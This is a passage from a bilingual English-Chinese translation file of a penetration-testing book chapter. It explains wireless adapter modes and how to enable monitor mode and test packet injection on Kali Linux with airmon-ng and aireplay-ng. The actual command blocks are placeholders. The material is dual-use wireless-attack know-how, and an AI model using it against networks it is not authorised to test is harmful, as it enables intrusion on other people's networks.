    will be covered later in this book.Having completed this section, you learnt how
    to connect a natively supported wireless network adapter onto Kali Linux via Oracle
    VirtualBox. In addition, you have also learnt how to install the necessary drivers
    that supports wireless network adapters with the RTL8812AU chipset. In the next
    section, you will learn about various operating modes of wireless network adapters
    and how they can be leverage for wireless penetration testing.
  id: totrans-265
  prefs: []
  type: TYPE_NORMAL
  zh: 如前所示，无线网络适配器现在已连接到 Kali Linux，这使我们能够在 2.4 GHz 和 5 GHz 无线频率上执行各种类型的基于无线的攻击。本书后续将介绍无线渗透测试。完成本节后，您将学习如何通过
    Oracle VirtualBox 将本地支持的无线网络适配器连接到 Kali Linux。此外，您还将学习如何安装支持带有 RTL8812AU 芯片组的无线网络适配器的必要驱动程序。在下一节中，您将学习无线网络适配器的各种操作模式以及如何利用它们进行无线渗透测试。
- en: Managing and monitoring wireless modes
  id: totrans-266
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 管理和监控无线模式
- en: 'As an ethical hacker and penetration tester, it’s important to have a clear
    understanding of the various operating modes of a wireless network adapter. Let’s
    take a look at each operating mode for wireless network adapters:'
  id: totrans-267
  prefs: []
  type: TYPE_NORMAL
  zh: 作为道德黑客和渗透测试人员，了解无线网络适配器的各种操作模式非常重要。让我们来看看无线网络适配器的每种操作模式：
- en: Managed – This is the default operating mode for all wireless network adapters.
    This mode enables a host device such as computer to connect to a nearby access
    point or wireless router. However, this mode does not enable ethical hackers and
    penetration tester to perform any type of wireless penetration testing techniques
    on a targeted wireless network.
  id: totrans-268
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 管理模式（Managed）– 这是所有无线网络适配器的默认操作模式。此模式使主机设备（如计算机）能够连接到附近的接入点或无线路由器。然而，此模式并不允许道德黑客和渗透测试人员对目标无线网络执行任何类型的无线渗透测试技术。
- en: Monitor – This operating mode enables ethical hackers and penetration tester
    to scan for IEEE 802.11 wireless networks within the vicinity, capture wireless
    frames such as beacons from access points and probes from wireless clients, and
    enables you to perform packet inject attacks on a targeted wireless network.
  id: totrans-269
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 监控模式（Monitor）– 此操作模式使道德黑客和渗透测试人员能够扫描周围的 IEEE 802.11 无线网络，捕获来自接入点的无线帧（如信标）和来自无线客户端的探针，并使您能够对目标无线网络执行数据包注入攻击。
- en: Master – This mode enables Linux-based operating systems to function as an access
    point or wireless router.
  id: totrans-270
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 主机模式（Master）– 此模式使基于 Linux 的操作系统能够充当接入点或无线路由器。
- en: Ad hoc – The ad-hoc mode enables the host system to directly connect to another
    host without the need for an intermediary device such as an access point or wireless
    router.
  id: totrans-271
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 临时模式（Ad hoc）– 临时模式使主机系统能够直接连接到另一个主机，而无需像接入点或无线路由器这样的中介设备。
- en: Repeater – This mode allows a host device to simply capture a wireless signal
    and reproduce it to other clients with the intention to extend the range of a
    wireless network. Keep in mind, repeaters are typically used to extend wireless
    signal coverage over distance.
  id: totrans-272
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 中继器模式（Repeater）– 该模式允许主机设备简单地捕获无线信号，并将其重播到其他客户端，以扩展无线网络的范围。请记住，中继器通常用于在远距离范围内扩展无线信号覆盖。
- en: Secondary – This mode enables a host to operate as a backup device for a master
    or repeater system.
  id: totrans-273
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 次级模式（Secondary）– 此模式使主机作为主设备或中继系统的备份设备运行。
- en: Now that you have an understanding of the various operating modes of wireless
    network adapters, let’s take a deeper dive into configuring monitoring mode and
    determine whether a wireless network adapter supports packet injection.
  id: totrans-274
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，您已经了解了无线网络适配器的各种操作模式，让我们更深入地探讨如何配置监控模式，并确定无线网络适配器是否支持数据包注入。
- en: Configuring monitoring mode
  id: totrans-275
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 配置监控模式
- en: 'In this section, you will learn how to configure a wireless network adapter
    to operating in monitor mode using native tools within Kali Linux. For this exercise,
    we’ll be using the Alfa AWUS036NHA wireless network adapter.To get started with
    this exercise, please use the following instructions:'
  id: totrans-276
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，您将学习如何使用 Kali Linux 中的本地工具将无线网络适配器配置为工作在监控模式下。对于本练习，我们将使用 Alfa AWUS036NHA
    无线网络适配器。开始此练习时，请按照以下说明操作：
- en: Ensure the Alfa AWUS036NHA wireless network adapter is connected to your host
    machine and it’s attached to the **Kali Linux** virtual machine via **Oracle VM
    VirtualBox Manager**.
  id: totrans-277
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 确保 Alfa AWUS036NHA 无线网卡已连接到主机，并通过 **Oracle VM VirtualBox Manager** 连接到 **Kali
    Linux** 虚拟机。
- en: 'Power-on the **Kali Linux** virtual machine. Open the **Terminal** and use
    the `iwconfig` command to verify whether the wireless network adapter is being
    detected by Kali Linux, as shown below:'
  id: totrans-278
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 启动 **Kali Linux** 虚拟机。打开 **终端** 并使用 `iwconfig` 命令验证 Kali Linux 是否检测到无线网卡，如下所示：
- en: '![](../media/file362.png)'
  id: totrans-279
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file362.png)'
- en: As shown in the preceding screenshot, the wireless network adapter is identified
    as `wlan0` and is operating in **Managed** mode.
  id: totrans-280
  prefs: []
  type: TYPE_NORMAL
  zh: 如前面的截图所示，无线网卡被标识为 `wlan0` 并且以 **Managed** 模式运行。
- en: 'Next, logically turn-down the wlan0 interface with the following commands:'
  id: totrans-281
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，逻辑上关闭 wlan0 接口，使用以下命令：
- en: '[PRE20]'
  id: totrans-282
  prefs: []
  type: TYPE_PRE
  zh: '[PRE20]'
- en: After executing the preceding command, use the `ifconfig` command to verify
    whether `wlan0` is no longer shown in the output. If the `wlan0` interface is
    still present, execute the `sudo ifconfig wlan0 down` command again.
  id: totrans-283
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 执行上述命令后，使用 `ifconfig` 命令验证输出中是否不再显示 `wlan0`。如果 `wlan0` 接口仍然存在，请再次执行 `sudo ifconfig
    wlan0 down` 命令。
- en: 'Next, change the operating mode of `wlan0` to **Monitor** with the following
    commands:'
  id: totrans-284
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，使用以下命令将 `wlan0` 的操作模式更改为 **Monitor**：
- en: '[PRE21]'
  id: totrans-285
  prefs: []
  type: TYPE_PRE
  zh: '[PRE21]'
- en: The preceding command will automatically re-enable the `wlan0` interface.
  id: totrans-286
  prefs: []
  type: TYPE_NORMAL
  zh: 上述命令将自动重新启用 `wlan0` 接口。
- en: 'Next, use the `iwconfig` command to verify the `wlan0` interface is configured
    in **Monitor** mode, as shown below:'
  id: totrans-287
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，使用 `iwconfig` 命令验证 `wlan0` 接口是否配置为 **Monitor** 模式，如下所示：
- en: '![](../media/file363.png)'
  id: totrans-288
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file363.png)'
- en: 'To test whether the attached wireless network adapter supports packet injection,
    use the following commands:'
  id: totrans-289
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要测试附加的无线网卡是否支持数据包注入，请使用以下命令：
- en: '[PRE22]'
  id: totrans-290
  prefs: []
  type: TYPE_PRE
  zh: '[PRE22]'
- en: 'Aireplay-ng is a component of the Aircrack-ng suite of wireless security tools
    for wireless penetration testing. Using the `-9` syntax enables the interface/adapter
    to test for packet injection while it operates in monitor mode, as shown below:'
  id: totrans-291
  prefs: []
  type: TYPE_NORMAL
  zh: Aireplay-ng 是 Aircrack-ng 无线安全工具套件的一部分，用于无线渗透测试。使用 `-9` 语法可在监视模式下测试数据包注入接口/适配器，如下所示：
- en: '![](../media/file364.png)'
  id: totrans-292
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file364.png)'
- en: To perform packet injection, the wireless network interface has to be in monitor
    mode.
  id: totrans-293
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 要执行数据包注入，无线网卡接口必须处于监视模式。
- en: 'Lastly, to revert the interface to managed mode, use the following commands:'
  id: totrans-294
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 最后，要将接口恢复为管理模式，请使用以下命令：
- en: '[PRE23]'
  id: totrans-295
  prefs: []
  type: TYPE_PRE
  zh: '[PRE23]'
- en: 'The following screenshot verifies the wireless network adapter has been successfully
    reverted to Managed mode:'
  id: totrans-296
  prefs: []
  type: TYPE_NORMAL
  zh: 下面的截图验证了无线网卡已成功恢复为 Managed 模式：
- en: '![](../media/file365.png)'
  id: totrans-297
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file365.png)'
- en: Having completed this exercise, you have learnt how enable monitor mode on a
    wireless network adapter using native tools within Kali Linux and testing whether
    packet injection is supported. Next, you will learn how to automate this process
    by using Aircrack-ng on Kali Linux.
  id: totrans-298
  prefs: []
  type: TYPE_NORMAL
  zh: 完成此练习后，您将学会如何在 Kali Linux 中使用本地工具启用无线网卡的监视模式，并测试是否支持数据包注入。接下来，您将学习如何通过在 Kali
    Linux 上使用 Aircrack-ng 自动化此过程。
- en: Using Aircrack-ng to enable monitor mode
  id: totrans-299
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 使用 Aircrack-ng 启用监视模式
- en: 'In this section, you will learn how to use Aircrack-ng, a suite of wireless
    security tools that’s commonly used by ethical hackers and penetration testers
    to enable monitor mode on wireless network adapters. For this exercise, we’ll
    be using the Alfa AWUS036NHA wireless network adapter.To get started with this
    exercise, please use the following instructions:'
  id: totrans-300
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，您将学习如何使用 Aircrack-ng，这是一套常用于伦理黑客和渗透测试人员的无线安全工具套件，用于启用无线网卡的监视模式。在此练习中，我们将使用
    Alfa AWUS036NHA 无线网卡。要开始此练习，请按以下说明操作：
- en: Ensure the Alfa AWUS036NHA wireless network adapter is connected to your host
    computer and it’s attached to the **Kali Linux** virtual machine **on Oracle VM
    VirtualBox Manager**.
  id: totrans-301
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 确保 Alfa AWUS036NHA 无线网卡已连接到主机计算机，并通过 **Oracle VM VirtualBox Manager** 连接到 **Kali
    Linux** 虚拟机。
- en: Next, power-on the **Kali Linux** virtual machine and login.
  id: totrans-302
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，启动 **Kali Linux** 虚拟机并登录。
- en: 'Next, open the **Terminal** within **Kali Linux** and use the `iwconfig` command
    to verify whether the Alfa AWUS036NHA wireless network adapter is detected, as
    shown below:'
  id: totrans-303
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，在 **Kali Linux** 中打开 **终端** 并使用 `iwconfig` 命令验证是否检测到 Alfa AWUS036NHA 无线网卡，如下所示：
- en: '![](../media/file366.png)'
  id: totrans-304
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file366.png)'
- en: 'Next, use the following commands to identify and terminate any background processes
    that may prevent the wireless network adapter from operating in monitor mode:'
  id: totrans-305
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，使用以下命令识别并终止可能妨碍无线网卡以监控模式运行的后台进程：
- en: '[PRE24]'
  id: totrans-306
  prefs: []
  type: TYPE_PRE
  zh: '[PRE24]'
- en: 'The following screenshot shows Airmon-ng found potentially conflicting processes
    and terminated it:'
  id: totrans-307
  prefs: []
  type: TYPE_NORMAL
  zh: 以下截图显示了Airmon-ng发现潜在的冲突进程并终止了它：
- en: '![](../media/file367.png)'
  id: totrans-308
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file367.png)'
- en: 'Next, enable monitor mode on the `wlan0` interface by using the following commands:'
  id: totrans-309
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，通过以下命令在`wlan0`接口上启用监控模式：
- en: '[PRE25]'
  id: totrans-310
  prefs: []
  type: TYPE_PRE
  zh: '[PRE25]'
- en: 'The following screenshot shows a new logically interface called `wlan0mon`
    was created as the monitor interface:'
  id: totrans-311
  prefs: []
  type: TYPE_NORMAL
  zh: 以下截图显示创建了一个新的逻辑接口`wlan0mon`作为监控接口：
- en: '![](../media/file368.png)'
  id: totrans-312
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file368.png)'
- en: 'Use the `iwconfig` command to verify the operation status of the newly created
    monitor interface, as shown below:'
  id: totrans-313
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 使用`iwconfig`命令验证新创建的监控接口的运行状态，如下所示：
- en: '![](../media/file369.png)'
  id: totrans-314
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file369.png)'
- en: 'Next, use Aircrack-ng to test whether packet inject is supported on `wlan0mon`,
    use the following commands:'
  id: totrans-315
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，使用Aircrack-ng测试`wlan0mon`是否支持数据包注入，使用以下命令：
- en: '[PRE26]'
  id: totrans-316
  prefs: []
  type: TYPE_PRE
  zh: '[PRE26]'
- en: 'The following screenshot shows Aireplay-ng was able to verify that packet injection
    is supported on the interface:'
  id: totrans-317
  prefs: []
  type: TYPE_NORMAL
  zh: 以下截图显示Aireplay-ng成功验证了接口支持数据包注入：
- en: '![](../media/file370.png)'
  id: totrans-318
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file370.png)'
- en: 'Lastly, to revert the wireless interface from monitor to managed mode, use
    the following commands:'
  id: totrans-319
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 最后，要将无线接口从监控模式切换回管理模式，请使用以下命令：
- en: '[PRE27]'
  id: totrans-320
  prefs: []
  type: TYPE_PRE
  zh: '[PRE27]'
- en: 'The following screenshot shows that Airmon-ng disabled monitor mode on the
    interface:'
  id: totrans-321
  prefs: []
  type: TYPE_NORMAL
  zh: 以下截图显示Airmon-ng禁用了该接口的监控模式：
- en: '![](../media/file371.png)'
  id: totrans-322
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file371.png)'
- en: 'Lastly, use the `iwconfig` command to verify the wireless interface is operating
    in managed mode, as shown below:'
  id: totrans-323
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 最后，使用`iwconfig`命令验证无线接口是否在管理模式下运行，如下所示：
- en: '![](../media/file372.png)'
  id: totrans-324
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file372.png)'
- en: Having completed this section, you have learnt how to configure wireless network
    adapters to operate in monitor mode using both native and automated tools within
    Kali Linux. In addition, you have learned how to test whether a wireless network
    adapter supports packet injection.
  id: totrans-325
  prefs: []
  type: TYPE_NORMAL
  zh: 完成本节内容后，你已经学会了如何在Kali Linux中使用本地工具和自动化工具配置无线网卡以在监控模式下运行。此外，你还学会了如何测试无线网卡是否支持数据包注入。
- en: Summary
  id: totrans-326
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 总结
- en: Having completed this chapter, you have learnt about the importance of network
    penetration testing and how it helps organizations to improve their cyber defensive
    and strategies to prevent future cyber-attacks and threats. In addition, you have
    discovered how to setup and work with both bind and reverse shell between different
    systems over a network. Furthermore, you have exploited how to setup wireless
    network adapters for performing wireless penetration testing in later chapters.I
    trust that the knowledge presented in this chapter has provided you with valuable
    insights, supporting your path towards becoming an ethical hacker and penetration
    tester in the dynamic field of cybersecurity. May this newfound understanding
    empower you in your journey, allowing you to navigate the industry with confidence
    and make a significant impact. In the next chapter, *Performing Network Penetration
    Testing*, you will learn how to perform network penetration testing to identify
    security vulnerabilities on targeted systems and networks.
  id: totrans-327
  prefs: []
  type: TYPE_NORMAL
  zh: 完成本章内容后，你已经了解了网络渗透测试的重要性，以及它如何帮助组织提高网络防御能力和制定防止未来网络攻击和威胁的策略。此外，你还学会了如何在不同系统之间设置和使用绑定和反向Shell进行网络操作。更进一步，你已经掌握了如何为执行无线渗透测试配置无线网卡，并将在后续章节深入学习。相信本章所提供的知识将为你提供宝贵的洞见，助你在成为一名道德黑客和渗透测试员的道路上稳步前行。愿这份新获得的理解，赋予你在网络安全领域中游刃有余的能力，信心满满地走向未来。下一章《执行网络渗透测试》中，你将学习如何执行网络渗透测试，以识别目标系统和网络的安全漏洞。
- en: Further Reading
  id: totrans-328
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 进一步阅读
- en: 'To learn about Aircrack-ng, go to: [https://www.aircrack-ng.org/doku.php?id=Main](https://www.aircrack-ng.org/doku.php?id=Main).'
  id: totrans-329
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 要了解Aircrack-ng，请访问：[https://www.aircrack-ng.org/doku.php?id=Main](https://www.aircrack-ng.org/doku.php?id=Main)。
